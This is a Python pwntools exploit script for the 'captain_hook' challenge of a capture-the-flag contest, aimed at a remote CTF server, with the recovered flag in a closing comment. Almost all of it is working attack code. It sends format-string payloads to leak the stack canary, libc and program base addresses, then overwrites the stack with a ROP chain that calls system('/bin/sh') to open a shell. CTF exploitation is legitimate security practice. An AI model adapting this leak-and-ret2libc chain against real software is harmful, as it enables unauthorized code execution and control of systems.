from pwn import *


def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


@debug
def lockup(index, name, age, date):
    io.recvuntil(b'$ ')
    io.sendline(b'2')

    io.recvuntil(b']: ')
    io.sendline(b'%d' % index)

    io.recvuntil(b'Name: ')
    io.sendline(name)
    io.sendline(b'%d' % age)
    io.send((date + b'\n')[:0xa])


@debug
def read(index):
    io.recvuntil(b'$ ')
    io.sendline(b'3')

    io.recvuntil(b']: ')
    io.sendline(b'%d' % index)
    io.recvuntil(b'up on ')
    data = io.recvuntil(b'.')
    return data


@debug
def edit(index, name, age, date):
    io.recvuntil(b'$ ')
    io.sendline(b'4')

    io.recvuntil(b']: ')
    io.sendline(b'%d' % index)

    io.recvuntil(b'Name: ')
    io.sendline(name)
    io.recvuntil(b'Age: ')
    io.sendline(b'%d' % age)
    io.recvuntil(b'): ')
    io.send(date)



binpath = './captain_hook'
libcpath = './libc-2.27.so'

elf = ELF(binpath)
libc = ELF(libcpath)

context.terminal = ['tmux', 'split-w', '-h']
context.binary = elf
# context.log_level = 'DEBUG'

gdbscript = '''
gef
# b *(0x0000555555554000+0x132A)
# b *(0x0000555555554000+0x12ff)
# printf
b *(0x555555554fb9)
# rop ret
b *0x000055555555518a
set $jail=(0x0000555555554000+0x202060)
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('sharkyctf.xyz', 20336)

lockup(0, b'AAAA', 20, b'11/11/1111')
print(read(0))

date = b'99/99/9999'
fsb = b'%13$p,%19$p,%15$p'
payload = b'C' * 10 + fsb
edit(0, payload, 20, date)
data = read(0)[10:].rstrip(b'.')

datas = list(map(lambda x: int(x, 16), data.split(b',')))
canary = datas[0]
addr_libc = datas[1] - 0x21b97
addr_prog = datas[2] - 0x135a
print('canary = 0x{:x}'.format(canary))
print('addr_libc = 0x{:x}'.format(addr_libc))
print('addr_prog = 0x{:x}'.format(addr_prog))


pop_rdi = addr_prog + 0x1423
ret = addr_prog + 0x8ce

payload = b''
payload += b'D' * 0x28
payload += p64(canary)
payload += p64(0xdeadbeefcafebabe)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(addr_libc + next(libc.search(b'/bin/sh')))
payload += p64(addr_libc + libc.symbols['system'])
payload += p64(0)
edit(0, payload, 20, b'22/22/2222')


io.interactive()


# shkCTF{I_R34lly_l0ve_fr33_H0Ok_m4n}
